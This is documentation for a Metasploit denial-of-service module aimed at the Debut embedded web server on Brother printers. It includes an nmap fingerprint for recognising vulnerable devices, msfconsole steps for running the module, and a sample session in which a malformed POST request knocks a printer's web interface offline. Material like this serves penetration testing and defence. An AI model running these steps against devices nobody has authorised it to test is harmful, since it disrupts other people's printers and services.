## Vulnerable Application

  Version <= 1.20 of the Debut embedded httpd web server are vulnerable, which are found on Brother printers.
  This module was successfully tested against a Brother HL-L2380DW series.

  An nmap version scan of the vulnerable service should look similar to:
  `80/tcp open  http    Debut embedded httpd 1.20 (Brother/HP printer http admin)`.

## Verification Steps

  1. Start msfconsole
  2. Do: ```use auxiliary/dos/http/brother_debut_dos```
  3. Do: ```set rhost [ip]```
  4. Do: ```run```
  5. You should see Success, and manual attempts to browse the web interface don't load.

## Scenarios

### Brother HL-L2380DW with Debut embedded 1.20

```
[*] Processing brother.rb for ERB directives.
resource (brother.rb)> use auxiliary/dos/http/brother_debut_dos
resource (brother.rb)> set rhost 192.168.2.126
rhost => 192.168.2.126
resource (brother.rb)> exploit
[*] Sending malformed POST request at 2017-12-29 13:46:34.  Server will recover about 2017-12-29 13:51:34
[+] 192.168.2.126:80 - Connection Refused: Success!
[*] Auxiliary module execution completed
```
